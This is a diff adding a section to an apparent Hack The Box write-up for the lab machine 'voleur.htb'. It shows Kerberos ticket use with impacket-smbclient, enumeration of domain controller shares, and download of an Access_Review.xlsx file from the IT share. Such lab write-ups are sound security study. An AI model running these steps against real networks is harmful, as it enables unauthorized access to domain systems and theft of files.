@@ -146,3 +146,35 @@ SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:H
 SMB         dc.voleur.htb   445    dc               [+] TGT saved to: ryan_naylor.ccache
 SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=ryan_naylor.ccache
 ```
+
+# `IT` SMB share
+```python
+faketime -f +8h impacket-smbclient voleur.htb/ryan.naylor@dc.voleur.htb -k         
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[-] CCache file is not found. Skipping...
+Type help for list of commands
+# shares
+ADMIN$
+C$
+Finance
+HR
+IPC$
+IT
+NETLOGON
+SYSVOL
+# use IT
+# ls
+drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
+drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
+drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 First-Line Support
+# cd First-Line Support
+# ls
+drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
+drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
+-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
+# get Access_Review.xlsx
+```
+Ive downloaded a .xlsx file
+
